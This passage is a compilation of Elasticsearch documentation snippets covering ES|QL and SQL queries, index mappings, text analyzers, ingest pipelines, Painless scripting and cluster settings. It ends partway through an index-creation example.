https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/drop.csv-spec/heightWithWildcard.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| DROP height*\n```\n\n----------------------------------------\n\nTITLE: Configuring Realm-based Audit Event Ignore Policy in Elasticsearch YAML\nDESCRIPTION: This setting specifies a list of authentication realm names or wildcards for which audit events will not be printed. It is a dynamic cluster setting that can be updated without restarting the cluster.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/auding-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.audit.logfile.events.ignore_filters.<policy_name>.realms\n```\n\n----------------------------------------\n\nTITLE: Specifying Numeric Parameters in Elasticsearch Request Body\nDESCRIPTION: Example of passing a numeric parameter as a string in an Elasticsearch request body, which is supported for all REST API parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_9\n\nLANGUAGE: sh\nCODE:\n```\nPOST /_search\n{\n  \"size\": \"1000\"\n}\n```\n\n----------------------------------------\n\nTITLE: Selecting and Renaming Columns in ESQL\nDESCRIPTION: This ESQL query selects the 'first_name' and 'last_name' columns from the 'employees' table, then renames them to 'fn' and 'ln' respectively. It demonstrates the use of KEEP for column selection and RENAME for column aliasing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/renameMultipleColumnsDifferentCommands.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name\n| RENAME first_name AS fn\n| RENAME last_name AS ln\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Typed Suggester Response\nDESCRIPTION: Response showing how the typed_keys parameter modifies suggester names by prefixing them with their types (term# and phrase#). Includes detailed suggestion results with scores and options for both suggesters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_28\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"suggest\": {\n    \"term#my-first-suggester\": [\n      {\n        \"text\": \"some\",\n        \"offset\": 0,\n        \"length\": 4,\n        \"options\": []\n      },\n      {\n        \"text\": \"test\",\n        \"offset\": 5,\n        \"length\": 4,\n        \"options\": []\n      },\n      {\n        \"text\": \"mssage\",\n        \"offset\": 10,\n        \"length\": 6,\n        \"options\": [\n          {\n            \"text\": \"message\",\n            \"score\": 0.8333333,\n            \"freq\": 4\n          }\n        ]\n      }\n    ],\n    \"phrase#my-second-suggester\": [\n      {\n        \"text\": \"some test mssage\",\n        \"offset\": 0,\n        \"length\": 16,\n        \"options\": [\n          {\n            \"text\": \"some test message\",\n            \"score\": 0.030227963\n          }\n        ]\n      }\n    ]\n  },\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Geo-distance query with lat/lon as array in Elasticsearch\nDESCRIPTION: This snippet showcases the use of the `geo_distance` filter with latitude and longitude specified as an array in `[lon, lat]` format within the `pin.location` field. The query searches for documents within a 12km radius of the specified coordinates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_distance\": {\n          \"distance\": \"12km\",\n          \"pin.location\": [ -70, 40 ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Kuromoji Analysis Response Example\nDESCRIPTION: Example response showing tokenization results from the kuromoji analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-tokenizer.md#2025-04-21_snippet_7\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\" : [ {\n    \"token\" : \"東京\",\n    \"start_offset\" : 0,\n    \"end_offset\" : 2,\n    \"type\" : \"word\",\n    \"position\" : 0\n  }, {\n    \"token\" : \"スカイツリー\",\n    \"start_offset\" : 2,\n    \"end_offset\" : 8,\n    \"type\" : \"word\",\n    \"position\" : 1\n  } ]\n}\n```\n\n----------------------------------------\n\nTITLE: Case-Sensitive Wildcard Matching in Elasticsearch EQL\nDESCRIPTION: Shows the use of the 'like' keyword for case-sensitive wildcard matching in Elasticsearch EQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_32\n\nLANGUAGE: eql\nCODE:\n```\nprocess_name like \"cmd*.exe\"\n```\n\n----------------------------------------\n\nTITLE: X-Pack License Header\nDESCRIPTION: Special license header required for Java files in the x-pack directory covered by the Elastic license\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_8\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one\n * or more contributor license agreements. Licensed under the Elastic License\n * 2.0; you may not use this file except in compliance with the Elastic License\n * 2.0.\n */\n```\n\n----------------------------------------\n\nTITLE: Profiled Method References in Elasticsearch\nDESCRIPTION: References to low-level Lucene methods that are instrumented during profiling operations. These methods (collect, advance, and next_doc) are called in tight loops and their instrumentation adds overhead.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_18\n\nLANGUAGE: text\nCODE:\n```\ncollect, advance, next_doc\n```\n\n----------------------------------------\n\nTITLE: Including NOW Function Description in ESQL Documentation\nDESCRIPTION: This snippet includes the description of the NOW function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/now.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/now.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Creating Time-Series Enabled Tour Index\nDESCRIPTION: Example showing how to create a time-series enabled index with geo_point data for tourism points of interest across different cities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geo-line.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT tour\n{\n    \"mappings\": {\n        \"properties\": {\n            \"city\": {\n                \"type\": \"keyword\",\n                \"time_series_dimension\": true\n            },\n            \"category\":   { \"type\": \"keyword\" },\n            \"route\":      { \"type\": \"long\" },\n            \"name\":       { \"type\": \"keyword\" },\n            \"location\":   { \"type\": \"geo_point\" },\n            \"@timestamp\": { \"type\": \"date\" }\n        }\n    },\n    \"settings\": {\n        \"index\": {\n            \"mode\": \"time_series\",\n            \"routing_path\": [ \"city\" ],\n            \"time_series\": {\n                \"start_time\": \"2023-01-01T00:00:00Z\",\n                \"end_time\": \"2024-01-01T00:00:00Z\"\n            }\n        }\n    }\n}\n\nPOST /tour/_bulk?refresh\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-02T09:00:00Z\", \"route\": 0, \"location\": \"POINT(4.889187 52.373184)\", \"city\": \"Amsterdam\", \"category\": \"Attraction\", \"name\": \"Royal Palace Amsterdam\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-02T10:00:00Z\", \"route\": 1, \"location\": \"POINT(4.885057 52.370159)\", \"city\": \"Amsterdam\", \"category\": \"Attraction\", \"name\": \"The Amsterdam Dungeon\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-02T13:00:00Z\", \"route\": 2, \"location\": \"POINT(4.901618 52.369219)\", \"city\": \"Amsterdam\", \"category\": \"Museum\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-02T16:00:00Z\", \"route\": 3, \"location\": \"POINT(4.912350 52.374081)\", \"city\": \"Amsterdam\", \"category\": \"Museum\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-03T12:00:00Z\", \"route\": 4, \"location\": \"POINT(4.914722 52.371667)\", \"city\": \"Amsterdam\", \"category\": \"Museum\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-04T09:00:00Z\", \"route\": 5, \"location\": \"POINT(4.401384 51.220292)\", \"city\": \"Antwerp\", \"category\": \"Attraction\", \"name\": \"Cathedral of Our Lady\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-04T12:00:00Z\", \"route\": 6, \"location\": \"POINT(4.405819 51.221758)\", \"city\": \"Antwerp\", \"category\": \"Museum\", \"name\": \"Snijders&Rockoxhuis\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-04T15:00:00Z\", \"route\": 7, \"location\": \"POINT(4.405200 51.222900)\", \"city\": \"Antwerp\", \"category\": \"Museum\", \"name\": \"Letterenhuis\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-05T10:00:00Z\", \"route\": 8, \"location\": \"POINT(2.336389 48.861111)\", \"city\": \"Paris\", \"category\": \"Museum\", \"name\": \"Musée du Louvre\"}\n{\"index\":{}}\n{\"@timestamp\": \"2023-01-05T14:00:00Z\", \"route\": 9, \"location\": \"POINT(2.327000 48.860000)\", \"city\": \"Paris\", \"category\": \"Museum\", \"name\": \"Musée dOrsay\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring System Properties Write Access in YAML\nDESCRIPTION: Configuration example showing how to grant a module or plugin permission to modify specific system properties. Can be applied to either named modules or unnamed plugins using 'ALL-UNNAMED'. The properties field lists which system properties can be modified.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/creating-classic-plugins.md#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\norg.example.module: # or 'ALL-UNNAMED' if the plugin is non-modular\n  - write_system_properties:\n      properties:\n        - property.one\n        - property.two\n```\n\n----------------------------------------\n\nTITLE: Running OpenTelemetry Integration Tests with Gradle\nDESCRIPTION: Executes YAML REST tests for index templates and ingest pipeline functionality in the OpenTelemetry Data plugin\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/otel-data/README.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n./gradlew :x-pack:plugin:otel-data:yamlRestTest\n```\n\n----------------------------------------\n\nTITLE: Time-series Dimensions with Pass-through Objects\nDESCRIPTION: Demonstrates configuring a pass-through field as a container for time-series dimensions in a data stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/passthrough.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT _index_template/my-metrics\n{\n  \"index_patterns\": [\"metrics-mymetrics-*\"],\n  \"priority\": 200,\n  \"data_stream\": { },\n  \"template\": {\n    \"settings\": {\n      \"index.mode\": \"time_series\"\n    },\n    \"mappings\": {\n      \"properties\": {\n        \"attributes\": {\n          \"type\": \"passthrough\",\n          \"priority\": 10,\n          \"time_series_dimension\": true,\n          \"properties\": {\n            \"host.name\": {\n              \"type\": \"keyword\"\n            }\n          }\n        },\n        \"cpu\": {\n          \"type\": \"integer\",\n          \"time_series_metric\": \"counter\"\n        }\n      }\n    }\n  }\n}\n\nPOST metrics-mymetrics-test/_doc\n{\n  \"@timestamp\": \"2020-01-01T00:00:00.000Z\",\n  \"attributes\" : {\n    \"host.name\": \"foo\",\n    \"zone\": \"bar\"\n  },\n  \"cpu\": 10\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Data with RLIKE in ESQL\nDESCRIPTION: This ESQL snippet demonstrates how to filter data using the `RLIKE` operator with a regular expression pattern. It filters the `employees` dataset to keep only the entries where `first_name` matches the pattern \".leja.*\". The query then keeps only the `first_name` and `last_name` fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/rlike.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE first_name RLIKE \"\\\".leja.*\\\"\"\n| KEEP first_name, last_name\n```\n\n----------------------------------------\n\nTITLE: Running Elasticsearch GeoIP Database Generation Tool\nDESCRIPTION: Command to generate GeoIP database files from a source directory, with optional target directory specification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_7\n\nLANGUAGE: sh\nCODE:\n```\n./bin/elasticsearch-geoip -s my/source/dir [-t target/directory]\n```\n\n----------------------------------------\n\nTITLE: Unsigned Right Shift with the Def Type in Painless\nDESCRIPTION: This example showcases the unsigned right shift operator with the def type in Painless, emphasizing the implicit casting that occurs during operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_29\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 16 >>> 2; <1>\ndef y = x >>> 1;  <2>\n```\n\n----------------------------------------\n\nTITLE: Configuring Kuromoji Analyzer with Hiragana Uppercase Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with a custom analyzer using the kuromoji_tokenizer and hiragana_uppercase filter. It also includes an example of analyzing text with the custom analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-hiragana-uppercase.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT kuromoji_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [\n              \"hiragana_uppercase\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET kuromoji_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"ちょっとまって\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining LOCATE Function Test Case in SQL\nDESCRIPTION: This SQL snippet defines a test case for the LOCATE function, which finds the position of a substring within a string. It includes various test scenarios to validate the function's behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/locate.md#2025-04-21_snippet_0\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT\n    LOCATE('bar', 'foobarbar') AS result1,\n    LOCATE('bar', 'foobarbar', 5) AS result2,\n    LOCATE('bar', 'foo') AS result3,\n    LOCATE('', 'foo') AS result4,\n    LOCATE('foo', '') AS result5,\n    LOCATE('', '') AS result6,\n    LOCATE('a', 'aaa') AS result7,\n    LOCATE('aa', 'aaa') AS result8,\n    LOCATE('aaa', 'aaa') AS result9,\n    LOCATE('', 'aaa') AS result10,\n    LOCATE('a', 'aaa', 2) AS result11,\n    LOCATE('aa', 'aaa', 2) AS result12,\n    LOCATE('aaa', 'aaa', 2) AS result13,\n    LOCATE('', 'aaa', 2) AS result14\n;\n\n-- { \"columns\": [\n--   {\"name\": \"result1\", \"type\": \"integer\"},\n--   {\"name\": \"result2\", \"type\": \"integer\"},\n--   {\"name\": \"result3\", \"type\": \"integer\"},\n--   {\"name\": \"result4\", \"type\": \"integer\"},\n--   {\"name\": \"result5\", \"type\": \"integer\"},\n--   {\"name\": \"result6\", \"type\": \"integer\"},\n--   {\"name\": \"result7\", \"type\": \"integer\"},\n--   {\"name\": \"result8\", \"type\": \"integer\"},\n--   {\"name\": \"result9\", \"type\": \"integer\"},\n--   {\"name\": \"result10\", \"type\": \"integer\"},\n--   {\"name\": \"result11\", \"type\": \"integer\"},\n--   {\"name\": \"result12\", \"type\": \"integer\"},\n--   {\"name\": \"result13\", \"type\": \"integer\"},\n--   {\"name\": \"result14\", \"type\": \"integer\"}\n-- ],\n-- \"rows\": [\n--   [4, 7, 0, 1, 0, 1, 1, 1, 1, 1, 2, 2, 0, 2]\n-- ] }\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Lowercase Filter in Elasticsearch\nDESCRIPTION: This example shows how to use the create index API to configure a new custom analyzer that incorporates the lowercase filter with a whitespace tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lowercase-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT lowercase_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_lowercase\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"lowercase\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ORDER BY with GROUP BY Example\nDESCRIPTION: Shows ordering of grouped results by gender in descending order.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_25\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender AS g, COUNT(*) AS c FROM emp GROUP BY gender ORDER BY g DESC;\n```\n\n----------------------------------------\n\nTITLE: Defining Advanced Sync Rules in Elasticsearch JavaScript\nDESCRIPTION: This JavaScript snippet configures rules to index files and folders in a specific directory structure, excluding files by extension. Proper JSON structuring ensures adherence to ownership and path specifications, critical for correct indexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"owners\": [\"user1-domain@onmicrosoft.com\", \"user3-domain@onmicrosoft.com\"],\n    \"skipFilesWithExtensions\": [\".pdf\", \".py\"],\n    \"parentPathPattern\": \"/drive/root:/hello/**/abc\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Defining Swedish Stop Words\nDESCRIPTION: Lists Swedish stop words for use in Elasticsearch analysis, providing a link to the Lucene document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_37\n\nLANGUAGE: markdown\nCODE:\n```\n`_swedish_`\n:   [Swedish stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/swedish_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Including MV_MIN Function Parameters in Markdown\nDESCRIPTION: This snippet includes the parameters documentation for the MV_MIN function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_min.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/mv_min.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Synthetic Source and Ignore_above for Keyword Field\nDESCRIPTION: This example demonstrates creating an index with synthetic _source and a keyword field with 'ignore_above' set, showing how values longer than the specified limit are handled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/keyword.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"kwd\": { \"type\": \"keyword\", \"ignore_above\": 3 }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"kwd\": [\"foo\", \"foo\", \"bang\", \"bar\", \"baz\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Setting GCE Discovery Trace Logging\nDESCRIPTION: Adds logging configuration to set the GCE discovery module to trace level for detailed debugging information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\n# discovery\nlogger.discovery_gce.name = discovery.gce\nlogger.discovery_gce.level = trace\n```\n\n----------------------------------------\n\nTITLE: Linear Weighted Average in Elasticsearch\nDESCRIPTION: Linear weighted moving average implementation that assigns decreasing weights to older datapoints linearly. Helps reduce lag in moving averages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_movavg\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"MovingFunctions.linearWeightedAvg(values)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing HTML Strip Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to create a custom HTML strip filter that skips the removal of specific HTML tags, in this case, the <b> tag.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-htmlstrip-charfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"keyword\",\n          \"char_filter\": [\n            \"my_custom_html_strip_char_filter\"\n          ]\n        }\n      },\n      \"char_filter\": {\n        \"my_custom_html_strip_char_filter\": {\n          \"type\": \"html_strip\",\n          \"escaped_tags\": [\n            \"b\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting ISO Week of Year with ISO_WEEK_OF_YEAR in SQL\nDESCRIPTION: Extracts the week of the year from a date/datetime expression per ISO 8601 standard. Returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_58\n\nLANGUAGE: sql\nCODE:\n```\n\"ISO_WEEK_OF_YEAR(datetime_exp) <1>\\n\"\n```\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT ISO_WEEK_OF_YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS week;\\n\\n     week\\n---------------\\n8\\n\"\n```\n\n----------------------------------------\n\nTITLE: String Concatenation with Space in ESQL\nDESCRIPTION: Demonstrates how to concatenate strings with a single space between them using CONCAT and SPACE functions. Creates a 'Hello World!' message by joining 'Hello' and 'World!' with a single space character.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/space.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = CONCAT(\"Hello\", SPACE(1), \"World!\");\n```\n\n----------------------------------------\n\nTITLE: Output of Letter Tokenizer in Elasticsearch\nDESCRIPTION: This snippet shows the output produced by the letter tokenizer when applied to the sample text. It demonstrates how the tokenizer breaks the text into terms, separating words and removing non-letter characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-letter-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ The, QUICK, Brown, Foxes, jumped, over, the, lazy, dog, s, bone ]\n```\n\n----------------------------------------\n\nTITLE: WKT Circle Processing Response Example\nDESCRIPTION: This snippet shows the response after indexing a WKT circle through the circle processor pipeline. The original circle has been converted to a polygon representation with coordinates adjusted to maintain the approximated shape within the specified error distance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-circle-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"found\": true,\n  \"_index\": \"circles\",\n  \"_id\": \"1\",\n  \"_version\": 1,\n  \"_seq_no\": 22,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"circle\": \"POLYGON ((30.000365257263184 10.0, 30.000111397193788 10.00034284530941, 29.999706043744222 10.000213571721195, 29.999706043744222 9.999786428278805, 30.000111397193788 9.99965715469059, 30.000365257263184 10.0))\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Geotile Document with Ingest Pipeline in Elasticsearch\nDESCRIPTION: Indexes a document with a geotile value using the 'geotile2shape' pipeline, converting it to a GeoJSON envelope.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-geo-grid-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT geocells/_doc/1?pipeline=geotile2shape\n{\n  \"geocell\": \"4/8/5\"\n}\n\nGET geocells/_doc/1\n```\n\n----------------------------------------\n\nTITLE: Creating a pipeline with character extraction limits\nDESCRIPTION: Example showing how to create an attachment processor pipeline with a limit on the number of characters to extract, including support for per-document limits.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/attachment\n{\n  \"description\" : \"Extract attachment information\",\n  \"processors\" : [\n    {\n      \"attachment\" : {\n        \"field\" : \"data\",\n        \"indexed_chars\" : 11,\n        \"indexed_chars_field\" : \"max_size\",\n        \"remove_binary\": true\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=attachment\n{\n  \"data\": \"e1xydGYxXGFuc2kNCkxvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0DQpccGFyIH0=\"\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Configuring a Custom Path Hierarchy Tokenizer in Elasticsearch\nDESCRIPTION: This example configures a custom path_hierarchy tokenizer with delimiter '-', replacement character '/', and skipping the first two tokens, then analyzes text with this custom analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pathhierarchy-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"path_hierarchy\",\n          \"delimiter\": \"-\",\n          \"replacement\": \"/\",\n          \"skip\": 2\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"one-two-three-four-five\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ /three, /three/four, /three/four/five ]\n```\n\n----------------------------------------\n\nTITLE: Using CIDR_MATCH Function in ESQL Query\nDESCRIPTION: Demonstrates how to use the CIDR_MATCH function to filter records based on whether an IP address (ip1) matches any of the specified CIDR blocks (127.0.0.2/32 or 127.0.0.3/32). The query returns selected fields including card, host, ip0, and ip1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/cidr_match.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM hosts\n| WHERE CIDR_MATCH(ip1, \"127.0.0.2/32\", \"127.0.0.3/32\")\n| KEEP card, host, ip0, ip1\n```\n\n----------------------------------------\n\nTITLE: Creating DateTime from Components\nDESCRIPTION: Shows how to create a ZonedDateTime object from individual datetime components.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_8\n\nLANGUAGE: painless\nCODE:\n```\nint year = 1983;\nint month = 10;\nint day = 13;\nint hour = 22;\nint minutes = 15;\nint seconds = 30;\nint nanos = 0;\nZonedDateTime zdt = ZonedDateTime.of(\n        year, month, day, hour, minutes, seconds, nanos, ZoneId.of('Z'));\n```\n\n----------------------------------------\n\nTITLE: SQL Query for Y-Coordinate using ST_Y\nDESCRIPTION: This SQL query selects points from a test table where the Y-coordinate is equal to 10.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_18\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT ST_AsWKT(point) FROM test WHERE ST_Y(point) = 10;\n```\n\n----------------------------------------\n\nTITLE: Parameterized Time Spans with Type Conversion in ESQL\nDESCRIPTION: Example of using parameterized time spans with type conversion functions for arithmetic operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-time-spans.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nPOST /_query\n{\n   \"query\": \"\"\"\n   FROM employees\n   | EVAL x = hire_date + ?timespan::DATE_PERIOD, y = hire_date - TO_DATEPERIOD(?timespan)\n   \"\"\",\n   \"params\": [{\"timespan\" : \"1 day\"}]\n}\n```\n\n----------------------------------------\n\nTITLE: Setting ILM Preference\nDESCRIPTION: Dynamic index-level setting to determine whether ILM or data stream lifecycle manages the backing index. Defaults to true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nindex.lifecycle.prefer_ilm: true\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Index for Version 6 in JSON\nDESCRIPTION: Defines an Elasticsearch index for version 6 with settings for shards and replicas, and mappings for document fields including title, content, and created_at.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\nPUT /index\n{\n  \"settings\": {\n    \"number_of_shards\": 1,\n    \"number_of_replicas\": 1\n  },\n  \"mappings\": {\n 